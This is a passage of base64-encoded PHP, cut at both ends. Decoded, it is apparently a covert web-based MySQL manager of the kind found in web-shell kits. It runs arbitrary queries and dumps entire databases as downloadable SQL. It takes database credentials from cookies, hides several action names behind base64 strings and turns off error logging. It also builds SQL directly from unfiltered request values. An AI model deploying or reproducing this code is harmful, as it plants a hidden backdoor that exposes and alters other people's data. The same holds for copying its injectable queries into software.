QgKTsNCgkkcFJlc3VsdExlbiA9IG15c3FsX2xpc3RfZmllbGRzKCAkZGJuYW1lLCAkdGFibGVuYW1lICk7DQoJZm9yKCAkaSA9IDA7ICRpIDwgJG51bTsgJGkrKyApIHsNCgkJJGZpZWxkID0gbXlzcWxfZmV0Y2hfYXJyYXkoICRwUmVzdWx0ICk7DQoJCSRmaWVsZG5hbWUgPSAkZmllbGRbIkZpZWxkIl07DQoJCSRmaWVsZHR5cGUgPSAkZmllbGRbIlR5cGUiXTsNCgkJJGxlbiA9IG15c3FsX2ZpZWxkX2xlbiggJHBSZXN1bHRMZW4sICRpICk7DQoJCWVjaG8gIjx0cj4iOw0KCQllY2hvICI8dGQ+JGZpZWxkbmFtZTwvdGQ+IjsNCgkJZWNobyAiPHRkPiIuJGZpZWxkWyJUeXBlIl0uIjwvdGQ+IjsNCgkJZWNobyAiPHRkPlxuIjsNCgkJZWNobyAiPHNlbGVjdCBuYW1lPSR7ZmllbGRuYW1lfV9mdW5jdGlvbj5cbiI7DQoJCWVjaG8gIjxvcHRpb24+XG4iOw0KCQllY2hvICI8b3B0aW9uPkFTQ0lJXG4iOw0KCQllY2hvICI8b3B0aW9uPkNIQVJcbiI7DQoJCWVjaG8gIjxvcHRpb24+U09VTkRFWFxuIjsNCgkJZWNobyAiPG9wdGlvbj5DVVJEQVRFXG4iOw0KCQllY2hvICI8b3B0aW9uPkNVUlRJTUVcbiI7DQoJCWVjaG8gIjxvcHRpb24+RlJPTV9EQVlTXG4iOw0KCQllY2hvICI8b3B0aW9uPkZST01fVU5JWFRJTUVcbiI7DQoJCWVjaG8gIjxvcHRpb24+Tk9XXG4iOw0KCQllY2hvICI8b3B0aW9uPlBBU1NXT1JEXG4iOw0KCQllY2hvICI8b3B0aW9uPlBFUklPRF9BRERcbiI7DQoJCWVjaG8gIjxvcHRpb24+UEVSSU9EX0RJRkZcbiI7DQoJCWVjaG8gIjxvcHRpb24+VE9fREFZU1xuIjsNCgkJZWNobyAiPG9wdGlvbj5VU0VSXG4iOw0KCQllY2hvICI8b3B0aW9uPldFRUtEQVlcbiI7DQoJCWVjaG8gIjxvcHRpb24+UkFORFxuIjsNCgkJZWNobyAiPC9zZWxlY3Q+XG4iOw0KCQllY2hvICI8L3RkPlxuIjsNCgkJJHZhbHVlID0gaHRtbHNwZWNpYWxjaGFycygkZGF0YVskaV0pOw0KCQlpZiggJGNtZCA9PSAiYWRkIiApIHsNCgkJCSR0eXBlID0gc3RydG9rKCAkZmllbGR0eXBlLCAiICgsKVxuIiApOw0KCQkJaWYoICR0eXBlID09ICJlbnVtIiB8fCAkdHlwZSA9PSAic2V0IiApIHsNCgkJCQllY2hvICI8dGQ+XG4iOw0KCQkJCWlmKCAkdHlwZSA9PSAiZW51bSIgKQ0KCQkJCQllY2hvICI8c2VsZWN0IG5hbWU9JGZpZWxkbmFtZT5cbiI7DQoJCQkJZWxzZSBpZiggJHR5cGUgPT0gInNldCIgKQ0KCQkJCQllY2hvICI8c2VsZWN0IG5hbWU9JGZpZWxkbmFtZSBzaXplPTQgbXVsdGlwbGU+XG4iOw0KCQkJCXdoaWxlKCAkc3RyID0gc3RydG9rKCAiJyIgKSApIHsNCgkJCQkJZWNobyAiPG9wdGlvbj4kc3RyXG4iOw0KCQkJCQlzdHJ0b2soICInIiApOw0KCQkJCX0NCgkJCQllY2hvICI8L3NlbGVjdD5cbiI7DQoJCQkJZWNobyAiPC90ZD5cbiI7DQoJCQl9IGVsc2Ugew0KCQkJCWlmKCAkbGVuIDwgNDAgKQ0KCQkJCQllY2hvICI8dGQ+PGlucHV0IHR5cGU9dGV4dCBzaXplPTQwIG1heGxlbmd0aD0kbGVuIG5hbWU9JGZpZWxkbmFtZT48L3RkPlxuIjsNCgkJCQllbHNlDQoJCQkJCWVjaG8gIjx0ZD48dGV4dGFyZWEgY29scz00MCByb3dzPTMgbWF4bGVuZ3RoPSRsZW4gbmFtZT0kZmllbGRuYW1lPjwvdGV4dGFyZWE+XG4iOw0KCQkJfQ0KCQl9IGVsc2UgaWYoICRjbWQgPT0gImVkaXQiICkgew0KCQkJJHR5cGUgPSBzdHJ0b2soICRmaWVsZHR5cGUsICIgKCwpXG4iICk7DQoJCQlpZiggJHR5cGUgPT0gImVudW0iIHx8ICR0eXBlID09ICJzZXQiICkgew0KCQkJCWVjaG8gIjx0ZD5cbiI7DQoJCQkJaWYoICR0eXBlID09ICJlbnVtIiApDQoJCQkJCWVjaG8gIjxzZWxlY3QgbmFtZT0kZmllbGRuYW1lPlxuIjsNCgkJCQllbHNlIGlmKCAkdHlwZSA9PSAic2V0IiApDQoJCQkJCWVjaG8gIjxzZWxlY3QgbmFtZT0kZmllbGRuYW1lIHNpemU9NCBtdWx0aXBsZT5cbiI7DQoJCQkJd2hpbGUoICRzdHIgPSBzdHJ0b2soICInIiApICkgew0KCQkJCQlpZiggJHZhbHVlID09ICRzdHIgKQ0KCQkJCQkJZWNobyAiPG9wdGlvbiBzZWxlY3RlZD4kc3RyXG4iOw0KCQkJCQllbHNlDQoJCQkJCQllY2hvICI8b3B0aW9uPiRzdHJcbiI7DQoJCQkJCXN0cnRvayggIiciICk7DQoJCQkJfQ0KCQkJCWVjaG8gIjwvc2VsZWN0PlxuIjsNCgkJCQllY2hvICI8L3RkPlxuIjsNCgkJCX0gZWxzZSB7DQoJCQkJaWYoICRsZW4gPCA0MCApDQoJCQkJCWVjaG8gIjx0ZD48aW5wdXQgdHlwZT10ZXh0IHNpemU9NDAgbWF4bGVuZ3RoPSRsZW4gbmFtZT0kZmllbGRuYW1lIHZhbHVlPVwiJHZhbHVlXCI+PC90ZD5cbiI7DQoJCQkJZWxzZQ0KCQkJCQllY2hvICI8dGQ+PHRleHRhcmVhIGNvbHM9NDAgcm93cz0zIG1heGxlbmd0aD0kbGVuIG5hbWU9JGZpZWxkbmFtZT4kdmFsdWU8L3RleHRhcmVhPlxuIjsNCgkJCX0NCgkJfQ0KCQllY2hvICI8L3RyPiI7DQoJfQ0KCWVjaG8gIjwvdGFibGU+PHA+XG4iOw0KCWlmKCAkY21kID09ICJhZGQiICkNCgkJZWNobyAiPGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSdBZGQgRGF0YSc+XG4iOw0KCWVsc2UgaWYoICRjbWQgPT0gImVkaXQiICkNCgkJZWNobyAiPGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSdFZGl0IERhdGEnPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1idXR0b24gdmFsdWU9J0NhbmNlbCcgb25DbGljaz0naGlzdG9yeS5iYWNrKCknPlxuIjsNCgllY2hvICI8L2Zvcm0+XG4iOw0KfQ0KDQpmdW5jdGlvbiBtYW5hZ2VEYXRhX3N1Ym1pdCggJGNtZCApIHsNCglnbG9iYWwgJG15c3FsSGFuZGxlLCAkZGJuYW1lLCAkdGFibGVuYW1lLCAkZmllbGRuYW1lLCAkUEhQX1NFTEYsICRxdWVyeVN0ciwgJGVyck1zZzsNCgkkcFJlc3VsdCA9IG15c3FsX2xpc3RfZmllbGRzKCAkZGJuYW1lLCAkdGFibGVuYW1lICk7DQoJJG51bSA9IG15c3FsX251bV9maWVsZHMoICRwUmVzdWx0ICk7DQoJbXlzcWxfc2VsZWN0X2RiKCAkZGJuYW1lLCAkbXlzcWxIYW5kbGUgKTsNCglpZiggJGNtZCA9PSAiYWRkIiApDQoJCSRxdWVyeVN0ciA9ICJJTlNFUlQgSU5UTyAkdGFibGVuYW1lIFZBTFVFUyAoIjsNCgllbHNlIGlmKCAkY21kID09ICJlZGl0IiApDQoJCSRxdWVyeVN0ciA9ICJSRVBMQUNFIElOVE8gJHRhYmxlbmFtZSBWQUxVRVMgKCI7DQoJZm9yKCAkaSA9IDA7ICRpIDwgJG51bS0xOyAkaSsrICkgew0KCQkkZmllbGQgPSBteXNxbF9mZXRjaF9maWVsZCggJHBSZXN1bHQgKTsNCgkJJGZ1bmMgPSAkR0xPQkFMU1skZmllbGQtPm5hbWUuIl9mdW5jdGlvbiJdOw0KCQlpZiggJGZ1bmMgIT0gIiIgKQ0KCQkJJHF1ZXJ5U3RyIC49ICIgJGZ1bmMoIjsNCgkJaWYoICRmaWVsZC0+bnVtZXJpYyA9PSAxICkgew0KCQkJJHF1ZXJ5U3RyIC49ICRHTE9CQUxTWyRmaWVsZC0+bmFtZV07DQoJCQlpZiggJGZ1bmMgIT0gIiIgKQ0KCQkJCSRxdWVyeVN0ciAuPSAiKSwiOw0KCQkJZWxzZQ0KCQkJCSRxdWVyeVN0ciAuPSAiLCI7DQoJCX0gZWxzZSB7DQoJCQkkcXVlcnlTdHIgLj0gIiciIC4gJEdMT0JBTFNbJGZpZWxkLT5uYW1lXTsNCgkJCWlmKCAkZnVuYyAhPSAiIiApDQoJCQkJJHF1ZXJ5U3RyIC49ICInKSwiOw0KCQkJZWxzZQ0KCQkJCSRxdWVyeVN0ciAuPSAiJywiOw0KCQl9DQoJfQ0KCSRmaWVsZCA9IG15c3FsX2ZldGNoX2ZpZWxkKCAkcFJlc3VsdCApOw0KCWlmKCAkZmllbGQtPm51bWVyaWMgPT0gMSApDQoJCSRxdWVyeVN0ciAuPSAkR0xPQkFMU1skZmllbGQtPm5hbWVdIC4gIikiOw0KCWVsc2UNCgkJJHF1ZXJ5U3RyIC49ICInIiAuICRHTE9CQUxTWyRmaWVsZC0+bmFtZV0gLiAiJykiOw0KCW15c3FsX3F1ZXJ5KCAkcXVlcnlTdHIgLCAkbXlzcWxIYW5kbGUgKTsNCgkkZXJyTXNnID0gbXlzcWxfZXJyb3IoKTsNCgl2aWV3RGF0YSggIiIgKTsNCn0NCg0KZnVuY3Rpb24gZGVsZXRlRGF0YSgpIHsNCglnbG9iYWwgJG15c3FsSGFuZGxlLCAkZGJuYW1lLCAkdGFibGVuYW1lLCAkZmllbGRuYW1lLCAkUEhQX1NFTEYsICRxdWVyeVN0ciwgJGVyck1zZzsNCgkkcFJlc3VsdCA9IG15c3FsX2xpc3RfZmllbGRzKCAkZGJuYW1lLCAkdGFibGVuYW1lICk7DQoJJG51bSA9IG15c3FsX251bV9maWVsZHMoICRwUmVzdWx0ICk7DQoJJGtleSA9ICIiOw0KCWZvciggJGkgPSAwOyAkaSA8ICRudW07ICRpKysgKSB7DQoJCSRmaWVsZCA9IG15c3FsX2ZldGNoX2ZpZWxkKCAkcFJlc3VsdCwgJGkgKTsNCgkJaWYoICRmaWVsZC0+cHJpbWFyeV9rZXkgPT0gMSApDQoJCQlpZiggJGZpZWxkLT5udW1lcmljID09IDEgKQ0KCQkJCSRrZXkgLj0gJGZpZWxkLT5uYW1lIC4gIj0iIC4gJEdMT0JBTFNbJGZpZWxkLT5uYW1lXSAuICIgQU5EICI7DQoJCQllbHNlDQoJCQkJJGtleSAuPSAkZmllbGQtPm5hbWUgLiAiPSciIC4gJEdMT0JBTFNbJGZpZWxkLT5uYW1lXSAuICInIEFORCAiOw0KCX0NCgkka2V5ID0gc3Vic3RyKCAka2V5LCAwLCBzdHJsZW4oJGtleSktNCApOw0KCW15c3FsX3NlbGVjdF9kYiggJGRibmFtZSwgJG15c3FsSGFuZGxlICk7DQoJJHF1ZXJ5U3RyID0gICJERUxFVEUgRlJPTSAkdGFibGVuYW1lIFdIRVJFICRrZXkiOw0KCW15c3FsX3F1ZXJ5KCAkcXVlcnlTdHIsICRteXNxbEhhbmRsZSApOw0KCSRlcnJNc2cgPSBteXNxbF9lcnJvcigpOw0KCXZpZXdEYXRhKCAiIiApOw0KfQ0KDQpmdW5jdGlvbiBmZXRjaF90YWJsZV9kdW1wX3NxbCgkdGFibGUpDQp7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwkZGJuYW1lOw0KCW15c3FsX3NlbGVjdF9kYiggJGRibmFtZSwgJG15c3FsSGFuZGxlICk7DQoJJHF1ZXJ5X2lkID0gbXlzcWxfcXVlcnkoIlNIT1cgQ1JFQVRFIFRBQkxFICR0YWJsZSIsJG15c3FsSGFuZGxlKTsNCgkkdGFibGVkdW1wID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHF1ZXJ5X2lkLCBNWVNRTF9BU1NPQyk7DQoJJHRhYmxlZHVtcCA9ICJEUk9QIFRBQkxFIElGIEVYSVNUUyAkdGFibGU7XG4iIC4gJHRhYmxlZHVtcFsnQ3JlYXRlIFRhYmxlJ10gLiAiO1xuXG4iOw0KCWVjaG8gJHRhYmxlZHVtcDsNCgkvLyBnZXQgZGF0YQ0KCSRyb3dzID0gbXlzcWxfcXVlcnkoIlNFTEVDVCAqIEZST00gJHRhYmxlIiwkbXlzcWxIYW5kbGUpOw0KCSRudW1maWVsZHM9bXlzcWxfbnVtX2ZpZWxkcygkcm93cyk7DQoJd2hpbGUgKCRyb3cgPSBteXNxbF9mZXRjaF9hcnJheSgkcm93cywgTVlTUUxfTlVNKSkNCgl7DQoJCSR0YWJsZWR1bXAgPSAiSU5TRVJUIElOVE8gJHRhYmxlIFZBTFVFUygiOw0KCQkkZmllbGRjb3VudGVyID0gLTE7DQoJCSRmaXJzdGZpZWxkID0gMTsNCgkJLy8gZ2V0IGVhY2ggZmllbGQncyBkYXRhDQoJCXdoaWxlICgrKyRmaWVsZGNvdW50ZXIgPCAkbnVtZmllbGRzKQ0KCQl7DQoJCQlpZiAoISRmaXJzdGZpZWxkKQ0KCQkJew0KCQkJCSR0YWJsZWR1bXAgLj0gJywgJzsNCgkJCX0NCgkJCWVsc2UNCgkJCXsNCgkJCQkkZmlyc3RmaWVsZCA9IDA7DQoJCQl9DQoJCQlpZiAoIWlzc2V0KCRyb3dbIiRmaWVsZGNvdW50ZXIiXSkpDQoJCQl7DQoJCQkJJHRhYmxlZHVtcCAuPSAnTlVMTCc7DQoJCQl9DQoJCQllbHNlDQoJCQl7DQoJCQkJJHRhYmxlZHVtcCAuPSAiJyIgLiBteXNxbF9lc2NhcGVfc3RyaW5nKCRyb3dbIiRmaWVsZGNvdW50ZXIiXSkgLiAiJyI7DQoJCQl9DQoJCX0NCgkJJHRhYmxlZHVtcCAuPSAiKTtcbiI7DQoJCWVjaG8gJHRhYmxlZHVtcDsNCgl9DQoJQG15c3FsX2ZyZWVfcmVzdWx0KCRyb3dzKTsNCn0NCg0KZnVuY3Rpb24gZHVtcCgpIHsNCglnbG9iYWwgJG15c3FsSGFuZGxlLCAkYWN0aW9uLCAkZGJuYW1lLCAkdGFibGVuYW1lOw0KCWlmKCAkYWN0aW9uID09ICJkdW1wVGFibGUiICl7DQoJCWhlYWRlcigiQ29udGVudC1kaXNwb3NpdGlvbjogZmlsZW5hbWU9JHRhYmxlbmFtZS5zcWwiKTsNCgkJaGVhZGVyKCdDb250ZW50LXR5cGU6IHVua25vd24vdW5rbm93bicpOw0KCQlmZXRjaF90YWJsZV9kdW1wX3NxbCgkdGFibGVuYW1lKTsNCgkJZWNobyAiXG5cblxuIjsNCgkJZWNobyAiXHJcblxyXG5cclxuIyMjICR0YWJsZW5hbWUgVEFCTEUgRFVNUCBDT01QTEVURUQgIyMjIjsNCgkJZXhpdDsNCgl9ZWxzZXsNCgkJaGVhZGVyKCJDb250ZW50LWRpc3Bvc2l0aW9uOiBmaWxlbmFtZT0kZGJuYW1lLnNxbCIpOw0KCQloZWFkZXIoJ0NvbnRlbnQtdHlwZTogdW5rbm93bi91bmtub3duJyk7DQoJCW15c3FsX3NlbGVjdF9kYiggJGRibmFtZSwgJG15c3FsSGFuZGxlICk7DQoJCSRxdWVyeV9pZCA9IG15c3FsX3F1ZXJ5KCJTSE9XIHRhYmxlcyIsJG15c3FsSGFuZGxlKTsNCgkJd2hpbGUgKCRyb3cgPSBteXNxbF9mZXRjaF9hcnJheSgkcXVlcnlfaWQsIE1ZU1FMX05VTSkpDQoJCXsNCgkJCQlmZXRjaF90YWJsZV9kdW1wX3NxbCgkcm93WzBdKTsNCgkJCQllY2hvICJcblxuXG4iOw0KCQkJCWVjaG8gIlxyXG5cclxuXHJcbiMjIyAkcm93WzBdIFRBQkxFIERVTVAgQ09NUExFVEVEICMjIyI7DQoJCQkJZWNobyAiXG5cblxuIjsNCgkJfQ0KCQllY2hvICJcclxuXHJcblxyXG4jIyMgJGRibmFtZSBEQVRBQkFTRSBEVU1QIENPTVBMRVRFRCAjIyMiOw0KCQlleGl0Ow0KCX0NCn0NCg0KZnVuY3Rpb24gdXRpbHMoKSB7DQoJZ2xvYmFsICRQSFBfU0VMRiwgJGNvbW1hbmQ7DQoJZWNobyAiPGgxPlV0aWxpdGllczwvaDE+XG4iOw0KCWlmKCAkY29tbWFuZCA9PSAiIiB8fCBzdWJzdHIoICRjb21tYW5kLCAwLCA1ICkgPT0gImZsdXNoIiApIHsNCgkJZWNobyAiPGhyPlxuIjsNCgkJZWNobyAiU2hvd1xuIjsNCgkJZWNobyAiPHVsPlxuIjsNCgkJZWNobyAiPGxpPjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dXRpbHMmY29tbWFuZD1zaG93X3N0YXR1cyc+U3RhdHVzPC9hPlxuIjsNCgkJZWNobyAiPGxpPjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dXRpbHMmY29tbWFuZD1zaG93X3ZhcmlhYmxlcyc+VmFyaWFibGVzPC9hPlxuIjsNCgkJZWNobyAiPGxpPjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dXRpbHMmY29tbWFuZD1zaG93X3Byb2Nlc3NsaXN0Jz5Qcm9jZXNzbGlzdDwvYT5cbiI7DQoJCWVjaG8gIjwvdWw+XG4iOw0KCQllY2hvICJGbHVzaFxuIjsNCgkJZWNobyAiPHVsPlxuIjsNCgkJZWNobyAiPGxpPjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dXRpbHMmY29tbWFuZD1mbHVzaF9ob3N0cyc+SG9zdHM8L2E+XG4iOw0KCQlpZiggJGNvbW1hbmQgPT0gImZsdXNoX2hvc3RzIiApIHsNCgkJCWlmKCBteXNxbF9xdWVyeSggIkZsdXNoIGhvc3RzIiApICE9IGZhbHNlICkNCgkJCQllY2hvICItIFN1Y2Nlc3MiOw0KCQkJZWxzZQ0KCQkJCWVjaG8gIi0gRmFpbCI7DQoJCX0NCgkJZWNobyAiPGxpPjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dXRpbHMmY29tbWFuZD1mbHVzaF9sb2dzJz5Mb2dzPC9hPlxuIjsNCgkJaWYoICRjb21tYW5kID09ICJmbHVzaF9sb2dzIiApIHsNCgkJCWlmKCBteXNxbF9xdWVyeSggIkZsdXNoIGxvZ3MiICkgIT0gZmFsc2UgKQ0KCQkJCWVjaG8gIi0gU3VjY2VzcyI7DQoJCQllbHNlDQoJCQkJZWNobyAiLSBGYWlsIjsNCgkJfQ0KCQllY2hvICI8bGk+PGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj11dGlscyZjb21tYW5kPWZsdXNoX3ByaXZpbGVnZXMnPlByaXZpbGVnZXM8L2E+XG4iOw0KCQlpZiggJGNvbW1hbmQgPT0gImZsdXNoX3ByaXZpbGVnZXMiICkgew0KCQkJaWYoIG15c3FsX3F1ZXJ5KCAiRmx1c2ggcHJpdmlsZWdlcyIgKSAhPSBmYWxzZSApDQoJCQkJZWNobyAiLSBTdWNjZXNzIjsNCgkJCWVsc2UNCgkJCQllY2hvICItIEZhaWwiOw0KCQl9DQoJCWVjaG8gIjxsaT48YSBocmVmPSckUEhQX1NFTEY/YWN0aW9uPXV0aWxzJmNvbW1hbmQ9Zmx1c2hfdGFibGVzJz5UYWJsZXM8L2E+XG4iOw0KCQlpZiggJGNvbW1hbmQgPT0gImZsdXNoX3RhYmxlcyIgKSB7DQoJCQlpZiggbXlzcWxfcXVlcnkoICJGbHVzaCB0YWJsZXMiICkgIT0gZmFsc2UgKQ0KCQkJCWVjaG8gIi0gU3VjY2VzcyI7DQoJCQllbHNlDQoJCQkJZWNobyAiLSBGYWlsIjsNCgkJfQ0KCQllY2hvICI8bGk+PGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj11dGlscyZjb21tYW5kPWZsdXNoX3N0YXR1cyc+U3RhdHVzPC9hPlxuIjsNCgkJaWYoICRjb21tYW5kID09ICJmbHVzaF9zdGF0dXMiICkgew0KCQkJaWYoIG15c3FsX3F1ZXJ5KCAiRmx1c2ggc3RhdHVzIiApICE9IGZhbHNlICkNCgkJCQllY2hvICItIFN1Y2Nlc3MiOw0KCQkJZWxzZQ0KCQkJCWVjaG8gIi0gRmFpbCI7DQoJCX0NCgkJZWNobyAiPC91bD5cbiI7DQoJfSBlbHNlIHsNCgkJJHF1ZXJ5U3RyID0gZXJlZ19yZXBsYWNlKCAiXyIsICIgIiwgJGNvbW1hbmQgKTsNCgkJJHBSZXN1bHQgPSBteXNxbF9xdWVyeSggJHF1ZXJ5U3RyICk7DQoJCWlmKCAkcFJlc3VsdCA9PSBmYWxzZSApIHsNCgkJCWVjaG8gIkZhaWwiOw0KCQkJcmV0dXJuOw0KCQl9DQoJCSRjb2wgPSBteXNxbF9udW1fZmllbGRzKCAkcFJlc3VsdCApOw0KCQllY2hvICI8cCBjbGFzcz1sb2NhdGlvbj4kcXVlcnlTdHI8L3A+XG4iOw0KCQllY2hvICI8aHI+XG4iOw0KCQllY2hvICI8dGFibGUgY2VsbHNwYWNpbmc9MSBjZWxscGFkZGluZz0yIGJvcmRlcj0wPlxuIjsNCgkJZWNobyAiPHRyPlxuIjsNCgkJZm9yKCAkaSA9IDA7ICRpIDwgJGNvbDsgJGkrKyApIHsNCgkJCSRmaWVsZCA9IG15c3FsX2ZldGNoX2ZpZWxkKCAkcFJlc3VsdCwgJGkgKTsNCgkJCWVjaG8gIjx0aD4iLiRmaWVsZC0+bmFtZS4iPC90aD5cbiI7DQoJCX0NCgkJZWNobyAiPC90cj5cbiI7DQoJCXdoaWxlKCAxICkgew0KCQkJJHJvd0FycmF5ID0gbXlzcWxfZmV0Y2hfcm93KCAkcFJlc3VsdCApOw0KCQkJaWYoICRyb3dBcnJheSA9PSBmYWxzZSApIGJyZWFrOw0KCQkJZWNobyAiPHRyPlxuIjsNCgkJCWZvciggJGogPSAwOyAkaiA8ICRjb2w7ICRqKysgKQ0KCQkJCWVjaG8gIjx0ZD4iLmh0bWxzcGVjaWFsY2hhcnMoICRyb3dBcnJheVskal0gKS4iPC90ZD5cbiI7DQoJCQllY2hvICI8L3RyPlxuIjsNCgkJfQ0KCQllY2hvICI8L3RhYmxlPlxuIjsNCgl9DQp9DQpmdW5jdGlvbiBmb290ZXJfaHRtbCgpIHsNCglnbG9iYWwgJG15c3FsSGFuZGxlLCAkZGJuYW1lLCAkdGFibGVuYW1lLCAkUEhQX1NFTEYsICRVU0VSTkFNRTsNCgllY2hvICI8aHI+XG4iOw0KCWVjaG8gIjxzcGFuIGNsYXNzPVwibmV3XCI+WyRVU0VSTkFNRV08L3NwYW4+IC0gXG4iOw0KCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249YkdsemRFUkNjdz09Jz5EYXRhYmFzZSBMaXN0PC9hPiB8IFxuIjsNCglpZiggJHRhYmxlbmFtZSAhPSAiIiApDQoJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249bGlzdFRhYmxlcyZkYm5hbWU9JGRibmFtZSZ0YWJsZW5hbWU9JHRhYmxlbmFtZSc+VGFibGUgTGlzdDwvYT4gfCAiOw0KCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dXRpbHMnPlV0aWxzPC9hPiB8XG4iOw0KCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249bG9nb3V0Jz5Mb2dvdXQ8L2E+XG4iOw0KfQ0KLy8tLS0tLS0tLS0tLS0tIE1BSU4gLS0tLS0tLS0tLS0tLSAvLw0KZXJyb3JfcmVwb3J0aW5nKDApOw0KaW5pX3NldCAoJ2Rpc3BsYXlfZXJyb3JzJywgMCk7DQppbmlfc2V0ICgnbG9nX2Vycm9ycycsIDApOw0KaWYoICRhY3Rpb24gPT0gImxvZ29uIiB8fCAkYWN0aW9uID09ICIiIHx8ICRhY3Rpb24gPT0gImxvZ291dCIgKQ0KCWxvZ29uKCk7DQplbHNlIGlmKCAkYWN0aW9uID09ICJiRzluYjI1ZmMzVmliV2wwIiApDQoJbG9nb25fc3VibWl0KCk7DQplbHNlIGlmKCAkYWN0aW9uID09ICJkdW1wVGFibGUiIHx8ICRhY3Rpb24gPT0gImR1bXBEQiIgKSB7DQoJd2hpbGUoIGxpc3QoJHZhciwgJHZhbHVlKSA9IGVhY2goJEhUVFBfQ09PS0lFX1ZBUlMpICkgew0KCQlpZiggJHZhciA9PSAibXlzcWxfd2ViX2FkbWluX3VzZXJuYW1lIiApICRVU0VSTkFNRSA9ICR2YWx1ZTsNCgkJaWYoICR2YXIgPT0gIm15c3FsX3dlYl9hZG1pbl9wYXNzd29yZCIgKSAkUEFTU1dPUkQgPSAkdmFsdWU7DQoJCWlmKCAkdmFyID09ICJteXNxbF93ZWJfYWRtaW5faG9zdG5hbWUiICkgJEhPU1ROQU1FID0gJHZhbHVlOw0KCX0NCgkkbXlzcWxIYW5kbGUgPSBAbXlzcWxfY29ubmVjdCggJEhPU1ROQU1FLiI6MzMwNiIsICRVU0VSTkFNRSwgJFBBU1NXT1JEICk7DQoJZHVtcCgpOw0KfSBlbHNlIHsNCgl3aGlsZSggbGlzdCgkdmFyLCAkdmFsdWUpID0gZWFjaCgkSFRUUF9DT09LSUVfVkFSUykgKSB7DQoJCWlmKCAkdmFyID09ICJteXNxbF93ZWJfYWRtaW5fdXNlcm5hbWUiICkgJFVTRVJOQU1FID0gJHZhbHVlOw0KCQlpZiggJHZhciA9PSAibXlzcWxfd2ViX2FkbWluX3Bhc3N3b3JkIiApICRQQVNTV09SRCA9ICR2YWx1ZTsNCgkJaWYoICR2YXIgPT0gIm15c3FsX3dlYl9hZG1pbl9ob3N0bmFtZSIgKSAkSE9TVE5BTUUgPSAkdmFsdWU7DQoJfQ0KCWVjaG8gIjwhLS0iOw0KCSRteXNxbEhhbmRsZSA9IEBteXNxbF9jb25uZWN0KCAkSE9TVE5BTUUuIjozMzA2IiwgJFVTRVJOQU1FLCAkUEFTU1dPUkQgKTsNCgllY2hvICItLT4iOw0KCWlmKCAkbXlzcWxIYW5kbGUgPT0gZmFsc2UgKSB7DQoJCWVjaG8gIjx0YWJsZSB3aWR0aD0xMDAlIGhlaWdodD0xMDAlPjx0cj48dGQ+PGNlbnRlcj5cbiI7DQoJCWVjaG8gIjxoMT5Xcm9uZyBQYXNzd29yZCE8L2gxPlxuIjsNCgkJZWNobyAiPGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj1sb2dvbic+TG9nb248L2E+XG4iOw0KCQllY2hvICI8L2NlbnRlcj48L3RkPjwvdHI+PC90YWJsZT5cbiI7DQoJfSBlbHNlIHsNCgkJaWYoICRhY3Rpb24gPT0gImJHbHpkRVJDY3c9PSIgKQ0KCQkJbGlzdERhdGFiYXNlcygpOw0KCQllbHNlIGlmKCAkYWN0aW9uID09ICJjcmVhdGVEQiIgKQ0KCQkJY3JlYXRlRGF0YWJhc2UoKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAiZHJvcERCIiApDQoJCQlkcm9wRGF0YWJhc2UoKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAibGlzdFRhYmxlcyIgKQ0KCQkJbGlzdFRhYmxlcygpOw0KCQllbHNlIGlmKCAkYWN0aW9uID09ICJjcmVhdGVUYWJsZSIgKQ0KCQkJY3JlYXRlVGFibGUoKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAiZHJvcFRhYmxlIiApDQoJCQlkcm9wVGFibGUoKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAidmlld1NjaGVtYSIgKQ0KCQkJdmlld1NjaGVtYSgpOw0KCQllbHNlIGlmKCAkYWN0aW9uID09ICJxdWVyeSIgKQ0KCQkJdmlld0RhdGEoICRxdWVyeVN0ciApOw0KCQllbHNlIGlmKCAkYWN0aW9uID09ICJhZGRGaWVsZCIgKQ0KCQkJbWFuYWdlRmllbGQoICJhZGQiICk7DQoJCWVsc2UgaWYoICRhY3Rpb24gPT0gImFkZEZpZWxkX3N1Ym1pdCIgKQ0KCQkJbWFuYWdlRmllbGRfc3VibWl0KCAiYWRkIiApOw0KCQllbHNlIGlmKCAkYWN0aW9uID09ICJlZGl0RmllbGQiICkNCgkJCW1hbmFnZUZpZWxkKCAiZWRpdCIgKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAiZWRpdEZpZWxkX3N1Ym1pdCIgKQ0KCQkJbWFuYWdlRmllbGRfc3VibWl0KCAiZWRpdCIgKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAiZHJvcEZpZWxkIiApDQoJCQlkcm9wRmllbGQoKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAiZG1sbGQwUmhkR0U9IiApDQoJCQl2aWV3RGF0YSggIiIgKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAiYWRkRGF0YSIgKQ0KCQkJbWFuYWdlRGF0YSggImFkZCIgKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAiYWRkRGF0YV9zdWJtaXQiICkNCgkJCW1hbmFnZURhdGFfc3VibWl0KCAiYWRkIiApOw0KCQllbHNlIGlmKCAkYWN0aW9uID09ICJlZGl0RGF0YSIgKQ0KCQkJbWFuYWdlRGF0YSggImVkaXQiICk7DQoJCWVsc2UgaWYoICRhY3Rpb24gPT0gImVkaXREYXRhX3N1Ym1pdCIgKQ0KCQkJbWF